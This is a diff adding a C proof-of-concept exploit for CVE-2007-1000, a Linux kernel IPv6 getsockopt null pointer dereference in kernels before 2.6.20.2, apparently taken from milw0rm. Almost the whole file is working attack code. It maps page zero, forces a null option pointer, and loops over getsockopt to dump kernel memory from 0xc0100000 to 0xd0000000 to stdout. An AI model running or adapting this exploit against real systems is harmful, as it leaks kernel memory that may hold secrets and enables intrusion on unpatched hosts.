@@ -1,0 +1,84 @@
+/*
+ * Linux Kernel IPV6_Getsockopt_Sticky Memory Leak  Proof Of Concept
+ * dreyer 07-2007
+ * Osu, Tatakae, Sexy Pandas!
+ *
+ *  Dumps to stdout the memory mapped between INI and END.
+ *
+ * CVE: CVE-2007-1000  BID: 22904
+ *
+ *  Affected: Linux Kernel < 2.6.20.2
+ *
+ * http://bugzilla.kernel.org/show_bug.cgi?id=8134
+ *
+ * Exploitation based on null pointer dereference: http://lists.immunitysec.com/pipermail/dailydave/2007-March/004133.html
+ *
+ * For free!!! ( worth 600 EUR in zerobay! )
+ *
+ */
+
+
+#include <sys/mman.h>
+#include <netinet/in.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+#define HOPOPT_OFFSET 8
+#define INIADDR 0xc0100000
+#define ENDADDR  0xd0000000
+unsigned int i;
+
+
+int main(int argc, char *argv[]) {
+  int s;
+  unsigned int optlen;
+  void *ptr;
+  char value[10240];
+  char text[12];
+
+  fprintf(stderr,"Ipv6_getsockopt_sticky vuln POC\n"
+                 "dreyer '07 - free feels better\n"
+                 "Dumping %p - %p to stdout\n",INIADDR,ENDADDR);
+
+  s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+  
+  /* Make np->opt = NULL = 0x00000000  through IPV6_2292PKTOPTIONS */
+  setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, (void *)NULL, 0);
+
+  /* Make 0x00000000 address valid */
+  ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
+
+  if (ptr != NULL) {
+      perror("mmap");
+      exit(-1);
+  }
+
+  memset(ptr,0,4096);
+
+  /* Make ptr point to np->opt->hopopt =  (0x00000000)->hopopt = 
+   * 0x00000000 + 8 */
+  ptr=(char *)((char *)ptr+HOPOPT_OFFSET);
+
+  i=INIADDR;
+  while(i<ENDADDR) {
+      /* Put in hopopt the address we want to read */
+      *((int *)ptr)=i;
+      optlen=10240;
+      /* Get the chunk pointed by hopopt through getsockopt IPV6_DSTOPTS */
+      getsockopt(s, IPPROTO_IPV6, IPV6_DSTOPTS, (void *)value, &optlen);
+      if(optlen>0) {
+          sprintf(text,"\n%08x:",i);
+          write(1,text,strlen(text));
+          write(1,value,optlen);
+          i=i+optlen;
+      } else {
+          /* We could not read this portion because of some error, skip it */
+          i=i+4;
+      }
+  }
+
+  return 0;
+}
+
+// milw0rm.com [2007-07-10]
